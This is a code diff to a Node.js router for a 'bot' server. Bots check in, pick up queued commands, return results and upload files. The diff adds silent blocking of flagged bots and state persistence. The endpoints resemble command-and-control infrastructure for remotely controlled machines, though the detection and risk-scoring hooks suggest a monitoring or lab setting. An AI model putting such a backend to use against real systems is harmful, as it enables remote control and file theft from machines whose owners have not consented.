@@ -9,6 +9,8 @@ const { botAuthed }               = require("../middleware/auth");
 const { getOrCreate, recordNetlog } = require("../controllers/botController");
 const { runDetection }            = require("../controllers/detectionEngine");
 const { computeRiskScore }        = require("../controllers/detectionEngine");
+const { bots: _bots }             = require("../state");
+const persist                     = require("../persist");
 
 const router = express.Router();
 
@@ -31,6 +33,8 @@ router.get("/checkin", (req, res) => {
   if (!botAuthed(req)) return res.status(403).send("");
   const id = req.query.id, info = req.query.info || "";
   if (!id) return res.status(400).send("");
+  // Silently ignore blocked bots — don't update state, don't log
+  if (_bots[id]?.blocked) return res.status(200).send("");
   const bot    = getOrCreate(id);
   bot.info     = info;
   bot.lastSeen = new Date().toISOString();
@@ -43,12 +47,12 @@ router.get("/cmd", (req, res) => {
   if (!botAuthed(req)) return res.status(403).send("");
   const id = req.query.id;
   if (!id) return res.status(400).send("");
-  const { bots } = require("../state");
-  const bot = bots[id];
-  if (!bot) return res.status(200).send("");
+  const bot = _bots[id];
+  if (!bot || bot.blocked) return res.status(200).send("");
   bot.lastSeen   = new Date().toISOString();
   const cmd      = bot.pendingCmd || "";
   bot.pendingCmd = "";
+  if (cmd) persist.scheduleSave();
   recordNetlog(bot, req, res, cmd.length);
   res.status(200).send(cmd);
 });
@@ -57,9 +61,11 @@ router.get("/result", (req, res) => {
   if (!botAuthed(req)) return res.status(403).send("");
   const id = req.query.id, data = req.query.data || "";
   if (!id) return res.status(400).send("");
+  if (_bots[id]?.blocked) return res.status(200).send("");
   const bot = getOrCreate(id);
   bot.lastSeen = new Date().toISOString();
   bot.results.push({ time: new Date().toISOString(), data });
+  persist.scheduleSave();
   recordNetlog(bot, req, res, data.length);
   console.log(`[result]  bot=${id}  ${data.substring(0, 80).replace(/%0A/g, " ")}`);
   res.status(200).send("");
@@ -69,9 +75,11 @@ router.post("/upload", upload.single("file"), (req, res) => {
   if (!botAuthed(req)) return res.status(403).send("");
   const id = req.query.id;
   if (!id || !req.file) return res.status(400).send("bad request");
+  if (_bots[id]?.blocked) return res.status(200).send("");
   const bot = getOrCreate(id);
   bot.lastSeen = new Date().toISOString();
   bot.files.push(req.file.filename);
+  persist.scheduleSave();
   recordNetlog(bot, req, res, req.file?.size || 0);
   console.log(`[upload]  bot=${id}  ${req.file.filename}`);
   res.status(200).send(req.file.filename);
@@ -81,6 +89,7 @@ router.post("/event", express.json({ limit: "64kb" }), (req, res) => {
   if (!botAuthed(req)) return res.status(403).send("");
   const id = req.query.id;
   if (!id) return res.status(400).send("");
+  if (_bots[id]?.blocked) return res.status(200).send("");
 
   const evt = req.body;
   if (!evt || typeof evt !== "object") return res.status(400).send("");
@@ -98,6 +107,7 @@ router.post("/event", express.json({ limit: "64kb" }), (req, res) => {
 
   runDetection(bot, evt);
   computeRiskScore(bot);
+  persist.scheduleSave();
   recordNetlog(bot, req, res, JSON.stringify(evt).length);
 
   res.status(200).send("");
